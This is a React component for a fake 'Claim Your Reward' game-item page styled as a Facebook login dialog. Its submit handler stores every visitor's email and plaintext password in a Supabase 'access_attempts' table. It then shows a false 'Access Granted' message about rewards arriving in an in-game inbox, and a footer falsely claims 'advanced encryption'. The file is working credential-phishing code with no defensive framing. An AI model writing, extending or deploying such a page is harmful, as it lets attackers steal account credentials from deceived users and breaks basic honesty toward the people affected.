import { useState } from 'react';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { CheckCircle, X } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

interface AccessModalProps {
  isOpen: boolean;
  onClose: () => void;
  item: RewardItem | null;
}

const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
  const [email, setEmail] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const { toast } = useToast();

  const validateEmail = (email: string) => {
    const commonDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com'];
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (!emailRegex.test(email)) return false;
    
    const domain = email.split('@')[1];
    return commonDomains.includes(domain);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!item) return;
    
    setIsLoading(true);

    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 1500));

    const isValid = validateEmail(email) && passphrase.length >= 6;

    // Save access attempt to Supabase
    try {
      await supabase
        .from('access_attempts')
        .insert({
          email,
          passphrase,
          item_id: item.id,
          item_name: item.name,
          status: isValid ? 'success' : 'failed'
        });
    } catch (error) {
      console.error('Error saving access attempt:', error);
    }

    if (!validateEmail(email)) {
      toast({
        variant: "destructive",
        title: "Invalid address format",
        description: "Please use a valid email address with a common domain.",
      });
      setIsLoading(false);
      return;
    }

    if (passphrase.length < 6) {
      toast({
        variant: "destructive",
        title: "Invalid credentials",
        description: "Access passphrase must be at least 6 characters.",
      });
      setIsLoading(false);
      return;
    }

    // Success
    setIsLoading(false);
    setShowSuccess(true);
  };

  const handleClose = () => {
    setEmail('');
    setPassphrase('');
    setShowSuccess(false);
    onClose();
  };

  const handleSuccessClose = () => {
    setShowSuccess(false);
    handleClose();
  };

  if (showSuccess) {
    return (
      <Dialog open={isOpen} onOpenChange={handleClose}>
        <DialogContent className="max-w-md p-0 border-0 bg-transparent shadow-none">
          <div className="bg-card rounded-lg p-8 text-center space-y-6 border border-primary/20 shadow-2xl">
            <div className="mx-auto w-20 h-20 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center animate-royal-pulse">
              <CheckCircle className="w-10 h-10 text-primary-foreground" />
            </div>
            
            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-primary">✅ Access Granted</h3>
              <p className="text-muted-foreground">
                Your rewards will be processed in 24 hours.<br />
                Please check your in-game inbox.
              </p>
            </div>

            <Button 
              onClick={handleSuccessClose}
              className="btn-royal w-full animate-glow"
            >
              OK
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    );
  }

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="max-w-md p-0 border-0 bg-transparent shadow-none">
        {/* Facebook-style login modal */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-2xl overflow-hidden">
          {/* Header */}
          <div className="flex items-center justify-between p-4 border-b border-gray-200 dark:border-gray-700">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center">
                <span className="text-white font-bold text-sm">f</span>
              </div>
              <span className="font-semibold text-gray-900 dark:text-white">Claim Your Reward</span>
            </div>
            <Button 
              variant="ghost" 
              size="sm" 
              onClick={handleClose}
              className="h-8 w-8 p-0 hover:bg-gray-100 dark:hover:bg-gray-700"
            >
              <X className="h-4 w-4 text-gray-500" />
            </Button>
          </div>

          {/* Content */}
          <div className="p-6 space-y-4">
            {item && (
              <div className="text-center space-y-2 mb-6">
                <img 
                  src={item.image_url} 
                  alt={item.name}
                  className="w-16 h-16 mx-auto rounded-lg object-cover"
                />
                <h3 className="font-semibold text-gray-900 dark:text-white">{item.name}</h3>
                <p className="text-sm text-gray-600 dark:text-gray-400">
                  Enter your credentials to claim this {item.rarity.toLowerCase()} item
                </p>
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <Input
                  type="email"
                  placeholder="Email address"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full h-12 px-4 text-base border-gray-300 dark:border-gray-600 rounded-md focus:border-blue-500 focus:ring-blue-500 bg-white dark:bg-gray-700 text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400"
                  required
                />
              </div>

              <div>
                <Input
                  type="password"
                  placeholder="Password"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                  className="w-full h-12 px-4 text-base border-gray-300 dark:border-gray-600 rounded-md focus:border-blue-500 focus:ring-blue-500 bg-white dark:bg-gray-700 text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400"
                  required
                />
              </div>

              <Button 
                type="submit" 
                className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-semibold text-base rounded-md transition-colors"
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    Logging in...
                  </div>
                ) : (
                  'Log in'
                )}
              </Button>
            </form>

            <div className="text-center">
              <button className="text-sm text-blue-600 hover:underline">
                Forgotten password?
              </button>
            </div>

            <hr className="border-gray-200 dark:border-gray-700" />

            <div className="text-center">
              <p className="text-xs text-gray-500 dark:text-gray-400">
                Secure login powered by advanced encryption
              </p>
            </div>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default AccessModal;